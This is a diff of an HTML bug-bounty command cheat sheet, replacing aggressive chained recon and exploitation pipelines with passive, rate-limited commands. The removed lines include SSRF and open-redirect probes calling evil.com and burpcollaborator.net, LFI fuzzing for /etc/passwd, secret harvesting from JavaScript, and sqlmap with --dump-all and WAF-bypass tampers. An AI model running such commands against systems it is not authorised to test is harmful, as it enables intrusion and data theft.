@@ -571,163 +571,83 @@
         </div>
 
 
-        <!-- Complete Bug Bounty Workflow (Enhanced) -->
-        <h2 class="tool-category">
-            <i class="fas fa-sitemap"></i> 🚀 Complete Bug Bounty Workflow (Advanced)
-        </h2>
+        <!-- Passive Web Recon & Public Intelligence -->
+        <h2 class="tool-category"><i class="fas fa-globe"></i> Passive Web Recon &amp; Public Intelligence</h2>
+        <p class="tool-description">Use public indexes and archives to discover what is already known about an in-scope domain. These are separate, copyable commands — no long chained pipeline.</p>
         <div class="tools-container">
-            <!-- Initial Recon -->
             <div class="tool-card">
-                <div class="tool-header">
-                    <h3>1. Advanced Subdomain Enum</h3>
-                    <button class="copy-btn" onclick="copyCommand('advanced-subdomains')">
-                        <i class="fas fa-copy"></i>
-                    </button>
-                </div>
-                <div class="tool-description">Comprehensive subdomain enumeration</div>
-                <div class="terminal-box">
-                    <span class="prompt">$</span>
-                    <span class="command" id="advanced-subdomains">subfinder -d {domain} -all -cs -recursive | tee subfinder.txt && amass enum -d {domain} -active -brute -w /path/to/wordlist.txt -rf /path/to/resolvers.txt -timeout 60 | tee amass.txt && findomain -t {domain} --quiet | tee findomain.txt && assetfinder --subs-only {domain} | tee assetfinder.txt && cat *.txt | sort -u > all_subdomains.txt</span>
-                </div>
+                <div class="tool-header"><h3>crt.sh Certificate Search</h3><button class="copy-btn" onclick="copyCommand('crtsh-json')"><i class="fas fa-copy"></i></button></div>
+                <div class="tool-description">Public CT logs · Requires: curl + jq</div>
+                <div class="terminal-box"><span class="prompt">$</span><span class="command" id="crtsh-json">curl -fsSG 'https://crt.sh/' --data-urlencode 'q=%.{domain}' --data-urlencode 'output=json' | jq -r '.[].name_value' | tr ',' '\n' | sed 's/^\*\.//' | sort -u</span></div>
             </div>
-
-            <!-- Historical Data -->
             <div class="tool-card">
-                <div class="tool-header">
-                    <h3>2. Historical Endpoints</h3>
-                    <button class="copy-btn" onclick="copyCommand('wayback-endpoints')">
-                        <i class="fas fa-copy"></i>
-                    </button>
-                </div>
-                <div class="tool-description">Discover historical endpoints and parameters</div>
-                <div class="terminal-box">
-                    <span class="prompt">$</span>
-                    <span class="command" id="wayback-endpoints">cat all_subdomains.txt | waybackurls | tee wayback.txt && cat all_subdomains.txt | gau --subs --threads 5 | tee gau.txt && cat wayback.txt gau.txt | sort -u | unfurl -u keys | tee -a params.txt</span>
-                </div>
+                <div class="tool-header"><h3>Wayback CDX URLs</h3><button class="copy-btn" onclick="copyCommand('wayback-cdx')"><i class="fas fa-copy"></i></button></div>
+                <div class="tool-description">Archived URLs · Requires: curl</div>
+                <div class="terminal-box"><span class="prompt">$</span><span class="command" id="wayback-cdx">curl -fsSG 'https://web.archive.org/cdx/search/cdx' --data-urlencode 'url=*.{domain}/*' --data-urlencode 'output=text' --data-urlencode 'fl=original' --data-urlencode 'collapse=urlkey' | sort -u</span></div>
             </div>
-
-            <!-- Advanced DNS -->
             <div class="tool-card">
-                <div class="tool-header">
-                    <h3>3. DNS & SSL Analysis</h3>
-                    <button class="copy-btn" onclick="copyCommand('dns-advanced')">
-                        <i class="fas fa-copy"></i>
-                    </button>
-                </div>
-                <div class="tool-description">Deep DNS and SSL certificate analysis</div>
-                <div class="terminal-box">
-                    <span class="prompt">$</span>
-                    <span class="command" id="dns-advanced">dnsx -l all_subdomains.txt -json -a -aaaa -cname -mx -ptr -soa -txt -resp | tee dns_info.json && cat all_subdomains.txt | tlsx -cn -san -en | tee ssl_info.txt && cat all_subdomains.txt | dnsx -silent -d -resp-only | naabu -top-ports 1000 -silent | tee ports.txt</span>
-                </div>
+                <div class="tool-header"><h3>GAU Historical URLs</h3><button class="copy-btn" onclick="copyCommand('gau-history')"><i class="fas fa-copy"></i></button></div>
+                <div class="tool-description">Wayback + Common Crawl + OTX + URLScan providers · Requires: gau</div>
+                <div class="terminal-box"><span class="prompt">$</span><span class="command" id="gau-history">gau --subs {domain} --threads 2 | sort -u &gt; gau-urls.txt</span></div>
             </div>
-
-            <!-- Live Host Discovery -->
             <div class="tool-card">
-                <div class="tool-header">
-                    <h3>4. Enhanced Host Discovery</h3>
-                    <button class="copy-btn" onclick="copyCommand('host-discovery')">
-                        <i class="fas fa-copy"></i>
-                    </button>
-                </div>
-                <div class="tool-description">Advanced live host discovery and analysis</div>
-                <div class="terminal-box">
-                    <span class="prompt">$</span>
-                    <span class="command" id="host-discovery">cat all_subdomains.txt | httpx -silent -title -tech-detect -status-code -follow-redirects -server -ip -cdn -asn -probe -csp-probe -tls-probe -favicon -ports 80,443,8080,8443 -json | tee httpx_results.json</span>
-                </div>
+                <div class="tool-header"><h3>waybackurls</h3><button class="copy-btn" onclick="copyCommand('waybackurls-basic')"><i class="fas fa-copy"></i></button></div>
+                <div class="tool-description">Wayback Machine URLs · Requires: waybackurls</div>
+                <div class="terminal-box"><span class="prompt">$</span><span class="command" id="waybackurls-basic">printf '%s\n' '{domain}' | waybackurls | sort -u &gt; wayback-urls.txt</span></div>
             </div>
-
-            <!-- Content Discovery -->
             <div class="tool-card">
-                <div class="tool-header">
-                    <h3>5. Advanced Content Discovery</h3>
-                    <button class="copy-btn" onclick="copyCommand('content-discovery')">
-                        <i class="fas fa-copy"></i>
-                    </button>
-                </div>
-                <div class="tool-description">Multi-tool content discovery</div>
-                <div class="terminal-box">
-                    <span class="prompt">$</span>
-                    <span class="command" id="content-discovery">cat httpx_results.json | jq -r '.url' | gospider -S - --js -t 50 --sitemap --robots -w -r | tee gospider.txt && ffuf -w /path/to/wordlist.txt -u FUZZ -mc 200,204,301,302,307,401,403,405 -recursion -recursion-depth 2 -c -v -t 50 | tee ffuf.txt</span>
-                </div>
+                <div class="tool-header"><h3>URLScan Historical Results</h3><button class="copy-btn" onclick="copyCommand('urlscan-search')"><i class="fas fa-copy"></i></button></div>
+                <div class="tool-description">Search public URLScan records · Requires: curl + jq + URLScan API key</div>
+                <div class="terminal-box"><span class="prompt">$</span><span class="command" id="urlscan-search">curl -fsSG 'https://urlscan.io/api/v1/search/' --data-urlencode 'q=domain:{domain}' --data-urlencode 'size=100' -H 'api-key: YOUR_URLSCAN_API_KEY' | jq -r '.results[]?.page.url' | sort -u</span></div>
             </div>
-
-            <!-- Parameter Discovery -->
             <div class="tool-card">
-                <div class="tool-header">
-                    <h3>6. Parameter Analysis</h3>
-                    <button class="copy-btn" onclick="copyCommand('param-analysis')">
-                        <i class="fas fa-copy"></i>
-                    </button>
-                </div>
-                <div class="tool-description">Advanced parameter discovery and testing</div>
-                <div class="terminal-box">
-                    <span class="prompt">$</span>
-                    <span class="command" id="param-analysis">cat httpx_results.json | jq -r '.url' | arjun -i - -oJ arjun.json && cat params.txt | qsreplace "FUZZ" | tee fuzz_ready.txt && for url in $(cat fuzz_ready.txt); do ffuf -u $url -w /path/to/payloads.txt -mr "FUZZ" -t 50; done</span>
-                </div>
+                <div class="tool-header"><h3>Common Crawl Index</h3><button class="copy-btn" onclick="copyCommand('commoncrawl-index')"><i class="fas fa-copy"></i></button></div>
+                <div class="tool-description">Find archived URLs in Common Crawl · Requires: curl + jq</div>
+                <div class="terminal-box"><span class="prompt">$</span><span class="command" id="commoncrawl-index">INDEX=$(curl -fsS 'https://index.commoncrawl.org/collinfo.json' | jq -r '.[0].cdx-api') &amp;amp;&amp;amp; curl -fsSG "$INDEX" --data-urlencode 'url=*.{domain}/*' --data-urlencode 'output=json' | jq -r '.url' | sort -u</span></div>
             </div>
-
-            <!-- Vulnerability Scanning -->
             <div class="tool-card">
-                <div class="tool-header">
-                    <h3>7. Advanced Vulnerability Scan</h3>
-                    <button class="copy-btn" onclick="copyCommand('vuln-scan')">
-                        <i class="fas fa-copy"></i>
-                    </button>
-                </div>
-                <div class="tool-description">Comprehensive vulnerability scanning</div>
-                <div class="terminal-box">
-                    <span class="prompt">$</span>
-                    <span class="command" id="vuln-scan">cat httpx_results.json | jq -r '.url' | nuclei -t nuclei-templates -severity critical,high,medium -rl 50 -c 25 -mhe 10 -o nuclei.txt && jaeles scan -s /path/to/jaeles-signatures -U httpx_results.json -L 50 -v -o jaeles_results</span>
-                </div>
+                <div class="tool-header"><h3>AlienVault OTX Passive DNS</h3><button class="copy-btn" onclick="copyCommand('otx-passive-dns')"><i class="fas fa-copy"></i></button></div>
+                <div class="tool-description">Passive DNS observations · Requires: curl + jq</div>
+                <div class="terminal-box"><span class="prompt">$</span><span class="command" id="otx-passive-dns">curl -fsS 'https://otx.alienvault.com/api/v1/indicators/domain/{domain}/passive_dns' | jq -r '.passive_dns[]?.hostname' | sort -u</span></div>
             </div>
-
-            <!-- JavaScript Analysis -->
             <div class="tool-card">
-                <div class="tool-header">
-                    <h3>8. JS Analysis</h3>
-                    <button class="copy-btn" onclick="copyCommand('js-analysis')">
-                        <i class="fas fa-copy"></i>
-                    </button>
-                </div>
-                <div class="tool-description">Deep JavaScript analysis</div>
-                <div class="terminal-box">
-                    <span class="prompt">$</span>
-                    <span class="command" id="js-analysis">cat httpx_results.json | jq -r '.url' | getJS --complete --resolve | tee js_files.txt && cat js_files.txt | xargs -I% sh -c 'echo "Analyzing %"; trufflehog filesystem % --json | tee -a js_secrets.json'</span>
-                </div>
+                <div class="tool-header"><h3>robots.txt Review</h3><button class="copy-btn" onclick="copyCommand('robots-txt')"><i class="fas fa-copy"></i></button></div>
+                <div class="tool-description">Read the site's published crawler rules · Requires: curl</div>
+                <div class="terminal-box"><span class="prompt">$</span><span class="command" id="robots-txt">curl -fsSL 'https://{domain}/robots.txt'</span></div>
             </div>
-
-            <!-- Advanced Pattern Matching -->
             <div class="tool-card">
-                <div class="tool-header">
-                    <h3>9. Pattern Analysis</h3>
-                    <button class="copy-btn" onclick="copyCommand('pattern-analysis')">
-                        <i class="fas fa-copy"></i>
-                    </button>
-                </div>
-                <div class="tool-description">Advanced pattern matching and analysis</div>
-                <div class="terminal-box">
-                    <span class="prompt">$</span>
-                    <span class="command" id="pattern-analysis">cat js_files.txt wayback.txt gau.txt gospider.txt | gf xss | tee gf_xss.txt && cat js_files.txt wayback.txt gau.txt gospider.txt | gf ssrf | tee gf_ssrf.txt && cat js_files.txt wayback.txt gau.txt gospider.txt | gf idor | tee gf_idor.txt && cat js_files.txt wayback.txt gau.txt gospider.txt | gf debug-pages | tee gf_debug.txt</span>
-                </div>
+                <div class="tool-header"><h3>Sitemap Review</h3><button class="copy-btn" onclick="copyCommand('sitemap-xml')"><i class="fas fa-copy"></i></button></div>
+                <div class="tool-description">Read published sitemap paths · Requires: curl</div>
+                <div class="terminal-box"><span class="prompt">$</span><span class="command" id="sitemap-xml">curl -fsSL 'https://{domain}/sitemap.xml'</span></div>
             </div>
-
-            <!-- Report Generation -->
             <div class="tool-card">
-                <div class="tool-header">
-                    <h3>10. Advanced Report</h3>
-                    <button class="copy-btn" onclick="copyCommand('advanced-report')">
-                        <i class="fas fa-copy"></i>
-                    </button>
-                </div>
-                <div class="tool-description">Generate comprehensive report</div>
-                <div class="terminal-box">
-                    <span class="prompt">$</span>
-                    <span class="command" id="advanced-report">echo "# Bug Bounty Report for {domain}\n\n## Overview\n" > report.md && echo "### Scope\n- Target: {domain}\n- Start Date: $(date)\n\n## Findings\n" >> report.md && for f in *.txt *.json; do echo "### $f\n\`\`\`" >> report.md && cat $f >> report.md && echo "\`\`\`\n" >> report.md; done && echo "## Summary\n- Total Subdomains: $(cat all_subdomains.txt | wc -l)\n- Live Hosts: $(cat httpx_results.json | wc -l)\n- Vulnerabilities: $(cat nuclei.txt | wc -l)" >> report.md</span>
-                </div>
+                <div class="tool-header"><h3>security.txt Check</h3><button class="copy-btn" onclick="copyCommand('security-txt')"><i class="fas fa-copy"></i></button></div>
+                <div class="tool-description">Find the site's security contact policy · Requires: curl</div>
+                <div class="terminal-box"><span class="prompt">$</span><span class="command" id="security-txt">for path in /.well-known/security.txt /security.txt; do echo "### $path"; curl -fsSL "https://{domain}$path"; done</span></div>
+            </div>
+            <div class="tool-card">
+                <div class="tool-header"><h3>Basic HTTP Response Headers</h3><button class="copy-btn" onclick="copyCommand('http-headers')"><i class="fas fa-copy"></i></button></div>
+                <div class="tool-description">Inspect response headers and redirects · Requires: curl</div>
+                <div class="terminal-box"><span class="prompt">$</span><span class="command" id="http-headers">curl -sSIL --max-redirs 5 'https://{domain}/'</span></div>
+            </div>
+            <div class="tool-card">
+                <div class="tool-header"><h3>TLS Certificate Summary</h3><button class="copy-btn" onclick="copyCommand('tls-cert')"><i class="fas fa-copy"></i></button></div>
+                <div class="tool-description">Inspect the presented TLS certificate · Requires: openssl</div>
+                <div class="terminal-box"><span class="prompt">$</span><span class="command" id="tls-cert">printf '' | openssl s_client -connect '{domain}:443' -servername '{domain}' 2&amp;gt;/dev/null | openssl x509 -noout -subject -issuer -dates -ext subjectAltName</span></div>
             </div>
         </div>
-           
-    <br>
+        <h2 class="tool-category"><i class="fas fa-sitemap"></i> Small Recon Commands</h2>
+        <div class="tools-container">
+            <div class="tool-card"><div class="tool-header"><h3>Passive Subdomains</h3><button class="copy-btn" onclick="copyCommand('quick-subfinder')"><i class="fas fa-copy"></i></button></div><div class="tool-description">Subfinder only · Requires: subfinder</div><div class="terminal-box"><span class="prompt">$</span><span class="command" id="quick-subfinder">subfinder -d {domain} -silent -o subdomains.txt</span></div></div>
+            <div class="tool-card"><div class="tool-header"><h3>Resolve Discovered Hosts</h3><button class="copy-btn" onclick="copyCommand('quick-dnsx')"><i class="fas fa-copy"></i></button></div><div class="tool-description">Resolve A records from a list · Requires: dnsx</div><div class="terminal-box"><span class="prompt">$</span><span class="command" id="quick-dnsx">dnsx -l subdomains.txt -silent -a -resp -o resolved-hosts.txt</span></div></div>
+            <div class="tool-card"><div class="tool-header"><h3>Check Live Web Hosts</h3><button class="copy-btn" onclick="copyCommand('quick-httpx')"><i class="fas fa-copy"></i></button></div><div class="tool-description">HTTP status and page title · Requires: httpx</div><div class="terminal-box"><span class="prompt">$</span><span class="command" id="quick-httpx">httpx -l subdomains.txt -silent -status-code -title -o live-hosts.txt</span></div></div>
+            <div class="tool-card"><div class="tool-header"><h3>Basic Web Crawl</h3><button class="copy-btn" onclick="copyCommand('quick-katana')"><i class="fas fa-copy"></i></button></div><div class="tool-description">Shallow crawl with JS and known-file parsing · Requires: katana</div><div class="terminal-box"><span class="prompt">$</span><span class="command" id="quick-katana">katana -u 'https://{domain}' -d 2 -jc -kf robotstxt,sitemapxml -rl 2 -silent -o crawl.txt</span></div></div>
+            <div class="tool-card"><div class="tool-header"><h3>Find JavaScript URLs</h3><button class="copy-btn" onclick="copyCommand('quick-js-urls')"><i class="fas fa-copy"></i></button></div><div class="tool-description">Filter archived URLs for JS files · Requires: gau</div><div class="terminal-box"><span class="prompt">$</span><span class="command" id="quick-js-urls">gau --subs {domain} | grep -Ei '\.js([?#].*)?$' | sort -u &gt; js-urls.txt</span></div></div>
+            <div class="tool-card"><div class="tool-header"><h3>Extract XSS Candidates</h3><button class="copy-btn" onclick="copyCommand('quick-gf-xss')"><i class="fas fa-copy"></i></button></div><div class="tool-description">Filter known URLs; does not test for XSS · Requires: gf</div><div class="terminal-box"><span class="prompt">$</span><span class="command" id="quick-gf-xss">cat urls.txt | gf xss | sort -u &gt; xss-candidates.txt</span></div></div>
+            <div class="tool-card"><div class="tool-header"><h3>Extract SQLi Candidates</h3><button class="copy-btn" onclick="copyCommand('quick-gf-sqli')"><i class="fas fa-copy"></i></button></div><div class="tool-description">Filter parameter URLs; does not confirm SQLi · Requires: gf</div><div class="terminal-box"><span class="prompt">$</span><span class="command" id="quick-gf-sqli">cat urls.txt | gf sqli | sort -u &gt; sqli-candidates.txt</span></div></div>
+            <div class="tool-card"><div class="tool-header"><h3>Normalize and Deduplicate URLs</h3><button class="copy-btn" onclick="copyCommand('quick-uro')"><i class="fas fa-copy"></i></button></div><div class="tool-description">Clean a URL list · Requires: uro</div><div class="terminal-box"><span class="prompt">$</span><span class="command" id="quick-uro">cat urls.txt | uro | sort -u &gt; clean-urls.txt</span></div></div>
+        </div>
+        <br>
         <div id="notification" class="notification" role="alert">
             <i class="fas fa-check-circle"></i>
             <span>Command copied to clipboard!</span>
@@ -752,7 +672,7 @@
                 <div class="tool-description">Find and verify subdomain takeovers</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="subdomain-takeover">subfinder -d {domain} | httpx -silent | subjack -w - -t 100 -timeout 30 -ssl -c fingerprints.json -v 3 >> takeover.txt</span>
+                    <span class="command" id="subdomain-takeover">subfinder -d {domain} -silent | httpx -silent -status-code -follow-host-redirects | tee takeover-candidates.txt</span>
                 </div>
             </div>
 
@@ -766,7 +686,7 @@
                 <div class="tool-description">Fast initial reconnaissance</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="quick-recon">echo {domain} | subfinder -silent | anew domains.txt | httpx -silent | nuclei -t nuclei-templates -o scan.txt</span>
+                    <span class="command" id="quick-recon">subfinder -d {domain} -silent -o subdomains.txt</span>
                 </div>
             </div>
 
@@ -780,7 +700,7 @@
                 <div class="tool-description">Find potentially vulnerable parameters</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="param-discovery">echo {domain} | waybackurls | gf xss | sed 's/=.*/=/' | sort -u | tee params.txt</span>
+                    <span class="command" id="param-discovery">cat urls.txt | gf xss | sort -u &gt; xss-candidates.txt</span>
                 </div>
             </div>
         </div>
@@ -800,7 +720,7 @@
                 <div class="tool-description">Complete XSS hunting pipeline</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="xss-pipeline">echo https://{domain}/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt</span>
+                    <span class="command" id="xss-pipeline">cat urls.txt | gf xss | sort -u &gt; xss-candidates.txt</span>
                 </div>
             </div>
 
@@ -814,7 +734,7 @@
                 <div class="tool-description">Advanced XSS scanning with Dalfox</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="dalfox-xss">cat xss_params.txt | dalfox pipe --blind https://your-collaborator-url --waf-bypass --silence</span>
+                    <span class="command" id="dalfox-xss">dalfox file xss-candidates.txt --silence --worker 5 --delay 100</span>
                 </div>
             </div>
         </div>
@@ -845,7 +765,7 @@
                 <div class="tool-description">Find sensitive files and configurations</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="sensitive-files">cat allurls.txt | grep -E "\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5"</span>
+                    <span class="command" id="sensitive-files">grep -Ei '\\.(xls|xlsx|xml|json|pdf|sql|doc|docx|zip|bak|log|db|yml|yaml|csv|txt)([?#].*)?$' urls.txt | sort -u</span>
                 </div>
             </div>
 
@@ -859,7 +779,7 @@
                 <div class="tool-description">Find exposed API keys in JavaScript files</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="api-keys">cat allurls.txt | grep -E "\.js$" | httpx-toolkit -mc 200 -content-type | grep -E "application/javascript|text/javascript" | cut -d' ' -f1 | xargs -I% curl -s % | grep -E "(API_KEY|api_key|apikey|secret|token|password)"</span>
+                    <span class="command" id="api-keys">grep -Ei '\\.js([?#].*)?$' urls.txt | sort -u &gt; js-urls.txt</span>
                 </div>
             </div>
         </div>
@@ -879,7 +799,7 @@
                 <div class="tool-description">Complete port scan with service detection</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="nmap-full">nmap -p- --min-rate 1000 -T4 -A {domain} -oA fullscan</span>
+                    <span class="command" id="nmap-full">nmap -sV -sC -T3 --top-ports 100 {domain} -oN nmap-top100.txt</span>
                 </div>
             </div>
 
@@ -893,7 +813,7 @@
                 <div class="tool-description">Fast port scanning with Masscan</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="masscan">masscan -p0-65535 {domain} --rate 100000 -oG masscan-results.txt</span>
+                    <span class="command" id="masscan">masscan {domain} -p80,443,8080,8443 --rate 100 -oL masscan-web-ports.txt</span>
                 </div>
             </div>
 
@@ -907,7 +827,7 @@
                 <div class="tool-description">Advanced port scanning with service detection</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="naabu-scan">naabu -list ip.txt -c 50 -nmap-cli 'nmap -sV -sC' -o naabu-full.txt</span>
+                    <span class="command" id="naabu-scan">naabu -host {domain} -top-ports 100 -rate 50 -o naabu-ports.txt</span>
                 </div>
             </div>
         </div>
@@ -927,7 +847,7 @@
                 <div class="tool-description">Test CORS configuration</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="cors-check">curl -H "Origin: http://evil.com" -I https://{domain}/wp-json/</span>
+                    <span class="command" id="cors-check">curl -sS -D - -o /dev/null -H 'Origin: https://example.org' 'https://{domain}/' </span>
                 </div>
             </div>
 
@@ -961,7 +881,7 @@
                 <div class="tool-description">Test for Local File Inclusion vulnerabilities</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="lfi-method">echo "https://{domain}/" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v</span>
+                    <span class="command" id="lfi-method">cat urls.txt | gf lfi | sort -u &gt; lfi-candidates.txt</span>
                 </div>
             </div>
 
@@ -975,7 +895,7 @@
                 <div class="tool-description">FFUF-based LFI vulnerability scanner</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="ffuf-lfi">ffuf -request lfi -request-proto https -w /root/wordlists/offensive\ payloads/LFI\ payload.txt -c -mr "root:"</span>
+                    <span class="command" id="ffuf-lfi">ffuf -u 'https://{domain}/FUZZ' -w /path/to/wordlist.txt -mc 200,204,301,302,401,403 -rate 10 -of json -o content-discovery.json</span>
                 </div>
             </div>
         </div>
@@ -995,7 +915,7 @@
                 <div class="tool-description">Aggressive WordPress vulnerability scan</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="wpscan">wpscan --url https://{domain} --disable-tls-checks --api-token YOUR_TOKEN -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force</span>
+                    <span class="command" id="wpscan">wpscan --url 'https://{domain}' --enumerate vp --plugins-detection passive --max-threads 2 --request-timeout 10</span>
                 </div>
             </div>
         </div>
@@ -1049,7 +969,7 @@
                 <div class="tool-description">Find and analyze JavaScript files</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="js-files">echo {domain} | gau | grep -E "\.js$" | httpx -silent -content-type | grep "application/javascript"</span>
+                    <span class="command" id="js-files">gau --subs {domain} | grep -Ei '\\.js([?#].*)?$' | sort -u &gt; js-urls.txt</span>
                 </div>
             </div>
 
@@ -1063,7 +983,7 @@
                 <div class="tool-description">Find secrets in JavaScript files</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="secret-finder">cat js_files.txt | nuclei -t nuclei-templates/exposures/ -o js_secrets.txt</span>
+                    <span class="command" id="secret-finder">nuclei -l js-urls.txt -t http/exposures/ -rl 2 -o js-exposure-findings.txt</span>
                 </div>
             </div>
         </div>
@@ -1199,7 +1119,7 @@
                 <div class="tool-description">Find SQL injection points</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="sqli-finder">echo {domain} | waybackurls | gf sqli | httpx -silent -path "'" | grep -E "SQL|sql|mysql|MySQL"</span>
+                    <span class="command" id="sqli-finder">cat urls.txt | gf sqli | sort -u &gt; sqli-candidates.txt</span>
                 </div>
             </div>
 
@@ -1213,7 +1133,7 @@
                 <div class="tool-description">Complete SQLMap scan with all features</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="sqlmap-full">sqlmap -u "https://{domain}" --crawl=5 --random-agent --batch --forms --threads=10 --level=5 --risk=3 --tamper=between,randomcase,space2comment --dump-all</span>
+                    <span class="command" id="sqlmap-full">sqlmap -u 'https://{domain}/item?id=1' -p id --batch --risk=1 --level=1 --technique=BE --threads=1 --delay=1 --timeout=5 --retries=0</span>
                 </div>
             </div>
 
@@ -1227,7 +1147,7 @@
                 <div class="tool-description">Test for blind SQL injection</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="blind-sqli">sqlmap -u "https://{domain}" --batch --random-agent --level=5 --risk=3 --technique=B --tamper=between,randomcase,space2comment</span>
+                    <span class="command" id="blind-sqli">sqlmap -u 'https://{domain}/item?id=1' -p id --batch --risk=1 --level=1 --technique=B --threads=1 --delay=1 --timeout=5 --retries=0</span>
                 </div>
             </div>
         </div>
@@ -1247,7 +1167,7 @@
                 <div class="tool-description">Detect SSRF vulnerabilities</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="ssrf-scanner">echo {domain} | waybackurls | gf ssrf | qsreplace http://burpcollaborator.net | while read url; do curl -s -I $url | grep burpcollaborator.net && echo $url; done</span>
+                    <span class="command" id="ssrf-scanner">cat urls.txt | gf ssrf | sort -u &gt; ssrf-candidates.txt</span>
                 </div>
             </div>
 
@@ -1261,7 +1181,7 @@
                 <div class="tool-description">Test for blind SSRF using headers</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="blind-ssrf">cat urls.txt | while read url; do echo "Testing: $url"; curl -s -I "$url" -H "X-Forwarded-For: burpcollaborator.net" -H "Referer: http://burpcollaborator.net" -H "X-Forwarded-Host: burpcollaborator.net"; done</span>
+                    <span class="command" id="blind-ssrf">echo 'Use an approved callback domain and manually verify a single in-scope candidate; do not probe cloud metadata or internal networks.'</span>
                 </div>
             </div>
         </div>
@@ -1281,7 +1201,7 @@
                 <div class="tool-description">Find open redirect vulnerabilities</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="open-redirect">echo {domain} | waybackurls | grep -a -i \=http | qsreplace 'https://evil.com' | while read host do; do curl -s -L $host -I | grep "evil.com" && echo "$host \033[0;31mVulnerable\n"; done</span>
+                    <span class="command" id="open-redirect">cat urls.txt | gf redirect | sort -u &gt; redirect-candidates.txt</span>
                 </div>
             </div>
 
@@ -1335,7 +1255,7 @@
                 <div class="tool-description">Test GraphQL endpoints for introspection</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="graphql-introspection">curl -X POST -H "Content-Type: application/json" -d '{"query":"{__schema{types{name,fields{name}}}}"}' https://{domain}/graphql</span>
+                    <span class="command" id="graphql-introspection">curl -sS -X POST 'https://{domain}/graphql' -H 'Content-Type: application/json' --data '{"query":"{__typename}"}'</span>
                 </div>
             </div>
 
@@ -1349,7 +1269,7 @@
                 <div class="tool-description">Find GraphQL endpoints</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="graphql-finder">echo {domain} | waybackurls | grep -i "graphql" | sort -u | httpx -silent -mc 200 -path "/graphql" -path "/api/graphql" -path "/v1/graphql"</span>
+                    <span class="command" id="graphql-finder">grep -i 'graphql' urls.txt | sort -u &gt; graphql-candidates.txt</span>
                 </div>
             </div>
         </div>
@@ -1369,7 +1289,7 @@
                 <div class="tool-description">Discover API endpoints</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="api-endpoints">echo {domain} | waybackurls | grep -i "/api/v" | sort -u | httpx -silent -mc 200,401,403,500</span>
+                    <span class="command" id="api-endpoints">grep -Ei '/api(/|$)|/v[0-9]+/' urls.txt | sort -u &gt; api-candidates.txt</span>
                 </div>
             </div>
 
@@ -1383,7 +1303,7 @@
                 <div class="tool-description">Find Swagger/OpenAPI documentation</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="swagger-finder">echo {domain} | httpx -silent -path "/swagger/index.html" -path "/swagger-ui.html" -path "/api-docs" -path "/openapi.json" -mc 200 -retries 2</span>
+                    <span class="command" id="swagger-finder">for path in /openapi.json /swagger.json /api-docs /swagger-ui/; do curl -sS -o /dev/null -w '%{http_code} %{url_effective}\n' 'https://{domain}'"$path"; done</span>
                 </div>
             </div>
         </div>
@@ -1437,7 +1357,7 @@
                 <div class="tool-description">Check for subdomain takeover using Nuclei</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="nuclei-takeover">subfinder -d {domain} -silent | httpx -silent | nuclei -t nuclei-templates/takeovers/ -o takeovers.txt</span>
+                    <span class="command" id="nuclei-takeover">nuclei -l live-hosts.txt -t http/takeovers/ -rl 2 -o takeover-findings.txt</span>
                 </div>
             </div>
 
@@ -1471,7 +1391,7 @@
                 <div class="tool-description">Advanced directory fuzzing</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="dir-fuzz">ffuf -u https://{domain}/FUZZ -w /path/to/wordlist.txt -mc 200,403 -t 100 -sf -s</span>
+                    <span class="command" id="dir-fuzz">ffuf -u 'https://{domain}/FUZZ' -w /path/to/wordlist.txt -mc 200,204,301,302,401,403 -rate 10 -of json -o ffuf-results.json</span>
                 </div>
             </div>
 
@@ -1485,7 +1405,7 @@
                 <div class="tool-description">Fuzz parameters for vulnerabilities</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="param-fuzz">ffuf -u https://{domain}/page?FUZZ=test -w /path/to/params.txt -mc all -fc 404 -t 100</span>
+                    <span class="command" id="param-fuzz">echo 'Use a small approved parameter wordlist and a single known in-scope endpoint; keep request rate low.'</span>
                 </div>
             </div>
         </div>
